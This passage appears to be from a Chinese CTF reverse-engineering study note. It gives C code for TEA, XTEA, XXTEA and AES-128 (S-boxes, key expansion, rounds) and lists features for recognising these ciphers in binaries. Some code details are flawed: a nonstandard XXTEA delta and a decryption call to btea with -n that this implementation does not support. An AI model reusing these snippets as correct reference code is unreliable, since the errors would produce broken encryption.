v0=v[0],v1=v[1],sum=0xC6EF3720,i;\t//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。//这里的数据类型可能会有符号，可以尝试改为int\tuint32_t delta=0x9e3779b9;\tuint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];\tfor (i=0;i&lt;32;i++)&#123;\t\tv1-=((v0 &lt;&lt; 4) + k2)^(v0 + sum)^((v0 &gt;&gt; 5) + k3);\t\tv0-=((v1 &lt;&lt; 4) + k0)^(v1 + sum)^((v1 &gt;&gt; 5) + k1);\t\tsum-=delta;\t&#125; \tv[0]=v0;v[1]=v1;&#125; int main()&#123;\tuint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;;  //若有多组数据，可以每两个进行加密。\tprintf(&quot;加密前的数据：%u %u\\n&quot;,v[0],v[1]);\t//%u 以十进制形式输出无符号整数 \tencrypt(v,k);\tprintf(&quot;加密后数据：%u %u\\n&quot;,v[0],v[1]);\tdecrypt(v,k);\tprintf(&quot;解密后数据：%u %u\\n&quot;,v[0],v[1]);\treturn 0;&#125;\n\n\n分组加密的分类密码学：分组密码.（块密码：是一种对称密码算法）_分组加密-CSDN博客\nCEB：明文的每个块都独立地加密成密文的每个块。\nCBC：个明文块先与前一个密文块进行异或(XOR)后再进行加密。第1个块中需要使用初始化向量(第一组密文与初始向量异或)。\nOFB：将之前一次的加密结果使用密钥再次进行加密(第1次对IV进行加密)，产生的块作为密钥流，然后将其与明文块进行异或，得到密文。\nCFB：类似OFB，只不过将上一组的密文作为下一组的输入来加密进行反馈。\n\nXTEA解析 TEA 加密算法(C语言、python)：_tea加密-CSDN博客\n演示动画\nXTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作\n代码#include&lt;stdio.h&gt;#include&lt;stdint.h&gt; void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])&#123;\tunsigned int i;\tuint32_t v0=v[0],v1=v[1],sum=0,delta=0x9E3779B9;\tfor(i=0;i&lt;num_rounds;i++)&#123;\t\tv0+=(((v1 &lt;&lt; 4)^(v1 &gt;&gt; 5)) + v1)^(sum + key[sum &amp; 3]);\t\tsum+=delta;\t\tv1+=((( v0 &lt;&lt; 4)^(v0 &gt;&gt; 5)) + v0)^(sum + key[(sum &gt;&gt; 11) &amp; 3]);\t&#125;\tv[0]=v0;v[1]=v1;&#125; void decipher(unsigned int num_rounds,uint32_t v[2],uint32_t const key[4])&#123;\tunsigned int i;\tuint32_t v0=v[0],v1=v[1],delta=0x9E3779B9,sum=delta*num_rounds;\tfor(i=0;i&lt;num_rounds;i++)&#123;\tv1-=(((v0 &lt;&lt; 4)^(v0 &gt;&gt; 5)) + v0)^(sum + key[(sum &gt;&gt; 11) &amp; 3]);\tsum-=delta;\tv0-=(((v1 &lt;&lt; 4)^(v1 &gt;&gt; 5)) + v1)^(sum + key[sum &amp; 3]);\t&#125; \tv[0]=v0;v[1]=v1;&#125; int main()&#123;\tuint32_t v[2]=&#123;1,2&#125;;\tuint32_t const k[4]=&#123;2,2,3,4&#125;;\tunsigned int r=32;\t\t\t\t//这里是加密轮数，自己设置 \tprintf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]);\tencipher(r,v,k);\tprintf(&quot;加密后原始数据：%u %u\\n&quot;,v[0],v[1]);\tdecipher(r,v,k);\tprintf(&quot;解密后原始数据：%u %u\\n&quot;,v[0],v[1]);\treturn 0;&#125;\n\n\n\nXXTEA解析 TEA 加密算法(C语言、python)：_tea加密-CSDN博客\nXXTEA在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥（16字节）。\n加密流程:最开始是以v[n-1]和v[1]得出v[0]，后面是用v[0]和v[2]得出v[1]，以此类推三组作为一次加密，每次加密遍历一遍，一共加密6+52&#x2F;n次。\n代码分析（来自上面的文章）\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#define DELTA 0x933779b9void btea(uint32_t *v,int n,uint32_t const key[4])&#123;\tuint32_t y,z,sum,delta;\tunsigned p,rounds,e;    delta = 0x933779b9;\trounds=6+52/n;\t//这里可以说是预定义值，n=2是rounds=32\tsum=0;\tz=v[n-1];\tdo\t&#123;\t\tsum+=delta;\t\te=(sum&gt;&gt;2)&amp;3;\t\tfor(p=0;p&lt;n-1;p++)        //注意这里的p是从0~n-1\t\t&#123;\t\t\ty=v[p+1];\t\t\tz=v[p]+=(((z &gt;&gt; 5 ^ y &lt;&lt; 2)+(y &gt;&gt; 3 ^ z &lt;&lt; 4))^((sum ^ y)+(key[(p &amp; 3) ^ e] ^ z)));\t\t&#125;\t\ty=v[0];\t\tz=v[n-1]+=(((z &gt;&gt; 5 ^ y &lt;&lt; 2)+(y &gt;&gt; 3 ^ z &lt;&lt; 4))^((sum ^ y)+(key[(p &amp; 3) ^ e] ^ z)));        //这里的MX中传入的p=n-1\t&#125;\t\twhile(--rounds);&#125;void dec_btea(uint32_t *v,int n,uint32_t const key[4])&#123;    uint32_t y,z,sum,delta;\tunsigned p,rounds,e;    delta = 0x933779b9;\trounds=6+52/n;\tsum=rounds*delta;\ty=v[0];\tdo\t&#123;\t\te=(sum&gt;&gt;2)&amp;3;\t\tfor(p=n-1;p&gt;0;p--)    //注意这里的p是从n-1~0,和上面是反过来的\t\t&#123;\t\t\tz=v[p-1];\t\t\ty=v[p]-=(((z &gt;&gt; 5 ^ y &lt;&lt; 2)+(y &gt;&gt; 3 ^ z &lt;&lt; 4))^((sum ^ y)+(key[(p &amp; 3) ^ e] ^ z)));\t\t&#125;\t\tz=v[n-1];\t\ty=v[0]-=(((z &gt;&gt; 5 ^ y &lt;&lt; 2)+(y &gt;&gt; 3 ^ z &lt;&lt; 4))^((sum ^ y)+(key[(p &amp; 3) ^ e] ^ z)));   //这里的MX中传入的 p=0\t\tsum-=delta;\t&#125;\twhile(--rounds);\t&#125;&#125; int main()&#123;\tuint32_t v[2]=&#123;1,2&#125;;\tuint32_t const k[4]=&#123;2,2,3,4&#125;;\tint n=2;\tprintf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]);\tbtea(v,n,k);\tprintf(&quot;加密后数据：%u %u\\n&quot;,v[0],v[1]);\tbtea(v,-n,k);\tprintf(&quot;解密后数据：%u %u\\n&quot;,v[0],v[1]);\treturn 0; \t&#125;\n\nTEA系列的特征TEA系列最明显的特征就是DELTA&#x3D;0x933779b9，有时值不一样，但是delta是一定有的。还有就是那一串异或相加加密的代码。\n在TEA和XTEA中每次加密只会涉及到两个密文，而XXTEA有三个密文。在XTEA和XXTEA中有&amp;3，而TEA中没有。在XXTEA中的轮数是6+52&#x2F;n。\nAESAES加密算法原理详解-CSDN博客\n演示动画\nAES 是一种对称密钥加密方法，依赖于分组密码，将数据分成块，对每个块进行加密以确保一致的安全性。AES 加密提供三种密钥长度——128 位、192 位和 256 位。包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。\nAES加密比较复杂，我们不深入研究，只掌握一些特征用于分析，具体解密方式可以用赛博厨师和Python脚本\n\n加密过程：密钥扩展–&gt;轮密钥生成–&gt;字节替换、行移位–&gt;列替换和轮密钥加\n\n密钥长度和轮数的对应\n\n128bits–&gt;10rounds\n192bits–&gt;12rounds\n256bits–&gt;14rounds\n\nS盒常量\n\n\nunsigned char S[256] = &#123;        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;\n\n代码实现(来自AES算法描述及C语言实现_c语言实现aes算法-CSDN博客)\n#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;typedef struct&#123;    uint32_t eK[44], dK[44];    // encKey, decKey    int Nr; // 10 rounds&#125;AesKey;#define BLOCKSIZE 16  //AES-128分组长度为16字节// uint8_t y[4] -&gt; uint32_t x#define LOAD32H(x, y) \\  do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\             ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)// uint32_t x -&gt; uint8_t y[4]#define STORE32H(x, y) \\  do &#123; (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \\       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)// 从uint32_t x中提取从低位开始的第n个字节#define BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)/* used for keyExpansion */// 字节替换然后循环左移1位#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))// uint32_t x循环左移n位#define ROF32(x, n)  (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))// uint32_t x循环右移n位#define ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */// AES-128轮常量static const uint32_t rcon[10] = &#123;        0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,        0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL&#125;;// S盒unsigned char S[256] = &#123;        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;//逆S盒unsigned char inv_S[256] = &#123;        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;/* copy in[16] to state[4][4] */int loadStateArray(uint8_t (*state)[4], const uint8_t *in) &#123;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[j][i] = *in++;        &#125;    &#125;    return 0;&#125;/* copy state[4][4] to out[16] */int storeStateArray(uint8_t (*state)[4], uint8_t *out) &#123;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            *out++ = state[j][i];        &#125;    &#125;    return 0;&#125;//秘钥扩展int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) &#123;    if (NULL == key || NULL == aesKey)&#123;        printf(&quot;keyExpansion param is NULL\\n&quot;);        return -1;    &#125;    if (keyLen != 16)&#123;        printf(&quot;keyExpansion keyLen = %d, Not support.\\n&quot;, keyLen);        return -1;    &#125;    uint32_t *w = aesKey-&gt;eK;  //加密秘钥    uint32_t *v = aesKey-&gt;dK;  //解密秘钥    /* keyLen is 16 Bytes, generate uint32_t W[44]. */    /* W[0-3] */    for (int i = 0; i &lt; 4; ++i) &#123;        LOAD32H(w[i], key + 4*i);    &#125;    /* W[4-43] */    for (int i = 0; i &lt; 10; ++i) &#123;        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];        w[5] = w[1] ^ w[4];        w[6] = w[2] ^ w[5];        w[7] = w[3] ^ w[6];        w += 4;    &#125;    w = aesKey-&gt;eK+44 - 4;    //解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥    //即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]    for (int j = 0; j &lt; 11; ++j) &#123;        for (int i = 0; i &lt; 4; ++i) &#123;            v[i] = w[i];        &#125;        w -= 4;        v += 4;    &#125;    return 0;&#125;// 轮秘钥加int addRoundKey(uint8_t (*state)[4], const uint32_t *key) &#123;    uint8_t k[4][4];    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            k[i][j] = (uint8_t) BYTE(key[j], 3 - i);  /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */            state[i][j] ^= k[i][j];        &#125;    &#125;    return 0;&#125;//字节替换int subBytes(uint8_t (*state)[4]) &#123;    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = S[state[i][j]]; //直接使用原始字节作为S盒数据下标        &#125;    &#125;    return 0;&#125;//逆字节替换int invSubBytes(uint8_t (*state)[4]) &#123;    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = inv_S[state[i][j]];        &#125;    &#125;    return 0;&#125;//行移位int shiftRows(uint8_t (*state)[4]) &#123;    uint32_t block[4] = &#123;0&#125;;    /* i: row */    for (int i = 0; i &lt; 4; ++i) &#123;    //便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t        LOAD32H(block[i], state[i]);        block[i] = ROF32(block[i], 8*i);        STORE32H(block[i], state[i]);    &#125;    return 0;&#125;//逆行移位int invShiftRows(uint8_t (*state)[4]) &#123;    uint32_t block[4] = &#123;0&#125;;    /* i: row */    for (int i = 0; i &lt; 4; ++i) &#123;        LOAD32H(block[i], state[i]);        block[i] = ROR32(block[i], 8*i);        STORE32H(block[i], state[i]);    &#125;    return 0;&#125;/* Galois Field (256) Multiplication of two Bytes */// 两字节的伽罗华域乘法运算uint8_t GMul(uint8_t u, uint8_t v) &#123;    uint8_t p = 0;    for (int i = 0; i &lt; 8; ++i) &#123;        if (u &amp; 0x01) &#123;    //            p ^= v;        &#125;        int flag = (v &amp; 0x80);        v &lt;&lt;= 1;        if (flag) &#123;            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */        &#125;        u &gt;&gt;= 1;    &#125;    return p;&#125;// 列混合int mixColumns(uint8_t (*state)[4]) &#123;    uint8_t tmp[4][4];    uint8_t M[4][4] = &#123;&#123;0x02, 0x03, 0x01, 0x01&#125;,                       &#123;0x01, 0x02, 0x03, 0x01&#125;,                       &#123;0x01, 0x01, 0x02, 0x03&#125;,                       &#123;0x03, 0x01, 0x01, 0x02&#125;&#125;;    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j)&#123;            tmp[i][j] = state[i][j];        &#125;    &#125;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;  //伽罗华域加法和乘法            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                        ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        &#125;    &#125;    return 0;&#125;// 逆列混合int invMixColumns(uint8_t (*state)[4]) &#123;    uint8_t tmp[4][4];    uint8_t M[4][4] = &#123;&#123;0x0E, 0x0B, 0x0D, 0x09&#125;,                       &#123;0x09, 0x0E, 0x0B, 0x0D&#125;,                       &#123;0x0D, 0x09, 0x0E, 0x0B&#125;,                       &#123;0x0B, 0x0D, 0x09, 0x0E&#125;&#125;;  //使用列混合矩阵的逆矩阵    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j)&#123;            tmp[i][j] = state[i][j];        &#125;    &#125;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                          ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        &#125;    &#125;    return 0;&#125;// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) &#123;    AesKey aesKey;    uint8_t *pos = ct;    const uint32_t *rk = aesKey.eK;  //解密秘钥指针    uint8_t out[BLOCKSIZE] = &#123;0&#125;;    uint8_t actualKey[16] = &#123;0&#125;;    uint8_t state[4][4] = &#123;0&#125;;    if (NULL == key || NULL == pt || NULL == ct)&#123;        printf(&quot;param err.\\n&quot;);        return -1;    &#125;    if (keyLen &gt; 16)&#123;        printf(&quot;keyLen must be 16.\\n&quot;);        return -1;    &#125;    if (len % BLOCKSIZE)&#123;        printf(&quot;inLen is invalid.\\n&quot;);        return -1;    &#125;    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);  // 秘钥扩展\t// 使用ECB模式循环加密多个分组长度的数据    for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123;\t\t// 把16字节的明文转换为4x4状态矩阵来进行处理        loadStateArray(state, pt);        // 轮秘钥加        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) &#123;            rk += 4;            subBytes(state);   // 字节替换            shiftRows(state);  // 行移位            mixColumns(state); // 列混合            addRoundKey(state, rk); // 轮秘钥加        &#125;        subBytes(state);    // 字节替换        shiftRows(state);  // 行移位        // 此处不进行列混合        addRoundKey(state, rk+4); // 轮秘钥加\t\t\t\t// 把4x4状态矩阵转换为uint8_t一维数组输出保存        storeStateArray(state, pos);        pos += BLOCKSIZE;  // 加密数据内存指针移动到下一个分组        pt += BLOCKSIZE;   // 明文数据指针移动到下一个分组        rk = aesKey.eK;    // 恢复rk指针到秘钥初始位置    &#125;    return 0;&#125;// AES128解密， 参数要求同加密int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) &#123;    AesKey aesKey;    uint8_t *pos = pt;    const uint32_t *rk = aesKey.dK;  //解密秘钥指针    uint8_t out[BLOCKSIZE] = &#123;0&#125;;    uint8_t actualKey[16] = &#123;0&#125;;    uint8_t state[4][4] = &#123;0&#125;;    if (NULL == key || NULL == ct || NULL == pt)&#123;        printf(&quot;param err.\\n&quot;);        return -1;    &#125;    if (keyLen &gt; 16)&#123;        printf(&quot;keyLen must be 16.\\n&quot;);        return -1;    &#125;    if (len % BLOCKSIZE)&#123;        printf(&quot;inLen is invalid.\\n&quot;);        return -1;    &#125;    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);  //秘钥扩展，同加密    for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123;        // 把16字节的密文转换为4x4状态矩阵来进行处理        loadStateArray(state, ct);        // 轮秘钥加，同加密        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) &#123;            rk += 4;            invShiftRows(state);    // 逆行移位            invSubBytes(state);     // 逆字节替换，这两步顺序可以颠倒            addRoundKey(state, rk); // 轮秘钥加，同加密            invMixColumns(state);   // 逆列混合        &#125;        invSubBytes(state);   // 逆字节替换        invShiftRows(state);  // 逆行移位        // 此处没有逆列混合        addRoundKey(state, rk+4);  // 轮秘钥加，同加密        storeStateArray(state, pos);  // 保存明文数据        pos += BLOCKSIZE;  // 输出数据内存指针移位分组长度        ct += BLOCKSIZE;   // 输入数据内存指针移位分组长度        rk = aesKey.dK;    // 恢复rk指针到秘钥初始位置    &#125;    return 0;&#125;// 方便输出16进制数据void printHex(uint8_t *ptr, int len, char *tag) &#123;    printf(&quot;%s\\ndata[%d]: &quot;, tag, len);    for (int i = 0; i &lt; len; ++i) &#123;        printf(&quot;%.2X &quot;, *ptr++);    &#125;    printf(&quot;\\n&quot;);&#125;int main() &#123;    return 0;&#125;\n\n加解密脚本#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;static const int S[16][16] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\t0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\t0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\t0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\t0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\t0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\t0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\t0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\t0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\t0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\t0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 